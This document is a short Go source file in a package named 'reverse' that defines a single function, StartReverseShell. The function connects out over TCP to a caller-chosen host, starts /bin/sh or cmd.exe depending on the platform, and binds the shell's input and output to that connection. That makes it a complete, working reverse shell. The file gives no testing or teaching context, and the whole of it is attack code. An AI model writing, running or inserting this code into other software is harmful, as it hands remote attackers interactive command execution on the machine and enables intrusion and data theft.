package reverse

import (
	"net"
	"os"
	"os/exec"
)

func StartReverseShell(target string) {
	conn, err := net.Dial("tcp", target)
	if err != nil {
		return
	}
	defer conn.Close()

	var shell string
	if os.PathSeparator == '/' {
		shell = "/bin/sh" // Linux/macOS
	} else {
		shell = "cmd.exe" // Windows
	}

	cmd := exec.Command(shell)
	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn
	cmd.Run()
}
